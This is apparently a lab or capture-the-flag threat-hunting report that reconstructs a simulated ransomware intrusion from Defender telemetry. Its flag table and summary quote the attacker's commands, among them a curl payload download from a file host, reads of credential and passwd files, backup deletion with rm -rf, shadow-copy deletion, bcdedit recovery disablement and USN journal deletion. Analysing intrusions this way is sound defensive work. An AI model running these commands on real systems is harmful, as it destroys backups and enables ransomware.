# 📚 Table of Contents

- [🧰 Platforms and Tools](#-platforms-and-tools)
- 🎯 Background, Objective, and Scope
- 🧠 Executive Summary
- 🔍 Summary of Findings (Flags)
- 🧩 Key Findings by Flag (With KQL + MITRE)
  - Phase 1: PHASE 1: LINUX BACKUP SERVER COMPROMISE (FLAGS 1-12)
  - PHASE 2: WINDOWS RANSOMWARE DEPLOYMENT (FLAGS 13-15)
  - PHASE 3: RECOVERY INHIBITION (FLAGS 16-22)
  - PHASE 4: PERSISTENCE (FLAGS 23-24)
  - PHASE 5: ANTI-FORENSICS (FLAG 25)
  - PHASE 6: RANSOMWARE SUCCESS (FLAG 26)
- [🎯 MITRE ATT&CK Technique Mapping](#-mitre-attck-technique-mapping)
- [💠 Diamond Model of Intrusion Analysis](#-diamond-model-of-intrusion-analysis)
- [🧾 Conclusion](#-conclusion)
- [🎓 Lessons Learned](#-lessons-learned)
- [🛠️ Recommendations for Remediation](#-recommendations-for-remediation)

---

## 🧰 Platforms and Tools

**Telemetry / Hunting Platform**
- Microsoft Defender for Endpoint (Advanced Hunting)

**Primary Tables Used**
- DeviceProcessEvents
- DeviceLogonEvents
- DeviceRegistryEvents
- DeviceFileEvents

**Analysis Method**
- Process + logon correlation (source → target)
- Command-line pivoting for LOLBins
- Persistence hunting (Registry Run Keys, Scheduled Tasks)
- Impact and anti-forensics verification

---

## 🎯 Background, Objective, and Scope

**Background**
The “Dead in the Water” scenario simulates a ransomware operator already inside an environment. The attacker progresses through backup compromise, recovery neutralization, lateral movement, ransomware execution, persistence, and anti-forensics.

**Objective**
Reconstruct the attacker’s behavior end-to-end, identify the commands/tools used at each stage, map actions to MITRE ATT&CK, and produce a report suitable for a SOC / client-facing incident summary.

**Scope**
***Systems involved (observed)***
- Windows workstation: adminpc / azuki-adminpc (source of remote execution)
- Linux backup server: azuki-backupsrv... (target of SSH pivot + backup destruction)

***Key attacker account observed***
- yuki.tanaka (Windows)
- backup-admin (Linux backup server)

---

## 🧠 Executive Summary

The attacker executed a ransomware playbook prioritizing ***recovery denial:***

1. Pivoted into backup infrastructure via SSH using a valid backup admin account ***(backup-admin@10.1.0.189)***.

2. Performed backup discovery (directories, archives, users, cron jobs) and accessed plaintext stored credentials in backup configs.

3. Transitioned to impact by deleting backups ***(rm -rf /backups/...)*** and disabling cron services ***(systemctl stop/disable cron)*** to prevent future backup creation.

4. Began Windows ransomware deployment using PsExec for remote execution.

5. Performed recovery inhibition and anti-forensics such as shadow copy manipulation, Windows recovery disablement (bcdedit), catalog deletion (wbadmin), and USN journal deletion (fsutil).

6. Established persistence using Registry Run keys and Scheduled Tasks masquerading as legitimate Windows security components.

7. Dropped ransom notes: ***SILENTLYNX_README.txt***.

---

## 🔍 Summary of Findings (Flags)

- ✅ Completed in this report: Flags 1–13 and 20–26
- ⏳ Placeholders (waiting on your exact Q/A): Flags 14–19

| Flag  | Phase              | Category            | Finding                                                           |
| ----- | ------------------ | ------------------- | ----------------------------------------------------------------- |
| 1     | Backup Compromise  | Lateral Movement    | `ssh.exe backup-admin@10.1.0.189`                                 |
| 2     | Backup Compromise  | Lateral Movement    | Source IP: `10.1.0.108`                                           |
| 3     | Backup Compromise  | Credential Abuse    | Account: `backup-admin`                                           |
| 4     | Backup Compromise  | Discovery           | `ls --color=auto -lh /backups/`                                   |
| 5     | Backup Compromise  | Discovery           | `find /backups -name *.tar.gz`                                    |
| 6     | Backup Compromise  | Discovery           | `cat /etc/passwd`                                                 |
| 7     | Backup Compromise  | Discovery           | `cat /etc/crontab`                                                |
| 8     | Backup Compromise  | Tool Transfer       | `curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z`       |
| 9     | Backup Compromise  | Credential Access   | `cat /backups/configs/all-credentials.txt`                        |
| 10    | Backup Compromise  | Destruction         | `rm -rf /backups/...`                                             |
| 11    | Backup Compromise  | Service Stop        | `systemctl stop cron`                                             |
| 12    | Backup Compromise  | Service Disabled    | `systemctl disable cron`                                          |
| 13    | Windows Deployment | Remote Execution    | `psexec64.exe`                                                    |
| 14    | Windows Deployment | Deployment Command  | -u kenji.sato -p ***** -c -f C:\Windows\Temp\cache\silentlynx.exe |
| 15    | Windows Deployment | Payload             | silentlynx.exe                                                    |
| 16    | Recovery Inhibition| silentlynx.exe      | net stop VSS /y                                                   |
| 17    | Recovery Inhibition| Bckup Engine Stopped| net stop wbengine /y                                              |
| 18    | Recovery Inhibition| Process Termination | taskkill /F /IM <process>.exe (ex: sqlservr.exe)                  |
| 19    | Recovery Inhibition| Shadw Copies Deleted| vssadmin delete shadows /all /quiet                               |
| 20    | Impact             | Recovery Inhibition | `vssadmin.exe resize shadowstorage /for=C: /on=C: /maxsize=401MB` |
| 21    | Impact             | Recovery Disabled   | `bcdedit /set {default} recoveryenabled No`                       |
| 22    | Impact             | Catalog Deleted     | `"wbadmin" delete catalog -quiet`                                 |
| 23    | Persistence        | Registry Run Key    | `WindowsSecurityHealth`                                           |
| 24    | Persistence        | Scheduled Task      | `Microsoft\Windows\Security\SecurityHealthService`                |
| 25    | Anti-Forensics     | Journal Deletion    | `fsutil.exe usn deletejournal /D C:`                              |
| 26    | Ransomware Success | Ransom Note         | `SILENTLYNX_README.txt`                                           |

---

